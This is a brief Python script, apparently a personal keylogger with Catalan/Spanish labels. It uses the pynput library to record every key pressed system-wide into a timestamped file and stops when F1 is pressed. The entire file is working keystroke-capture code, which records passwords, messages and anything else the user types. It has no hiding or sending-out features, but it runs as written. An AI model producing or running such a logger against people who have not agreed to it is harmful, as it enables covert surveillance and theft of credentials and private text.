#!/usr/bin/env python3

from pynput import keyboard
# from pynput import mouse #if would mouse
import os

from datetime import datetime

now = datetime.now()
data = str(now.day)+"-"+str(now.month)+"-"+str(now.year)+"--"+str(now.hour)+":"+str(now.minute)
fitxer= "data/"+data+".dat"

if os.path.isfile(fitxer):
    os.remove(fitxer)

f = open(fitxer, "w")
f.write("\n \n"+data+"\n \n")


def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    if key_name == "Key.space":
        f.write(" ")
    elif key_name == "Key.enter":
        f.write("\n")
    elif key_name == "Key.f1":
        now = datetime.now()
        data = str(now.day) + "-" + str(now.month) + "-" + str(now.year) + "--" + str(now.hour) + ":" + str(now.minute)
        f.write("\n \n" + data + "\n \n")
        f.write("\n \n EXIT ")
        f.close()
        return False
    elif key_name == "Key.backspace":
        f.write(" **BORRAR**")
    elif key_name == "Key.tab":
        f.write("  *tab*  ")
    elif key_name == "Key.shift_r":
        f.write("")
    elif key_name == "Key.esc":
        f.write(" *esc* ")
    elif key_name == "Key.caps_lock":
        f.write("   **Majus**   ")
    else:
        f.write(key_name)

with keyboard.Listener(
    on_press = on_press) as listener:
    listener.join()


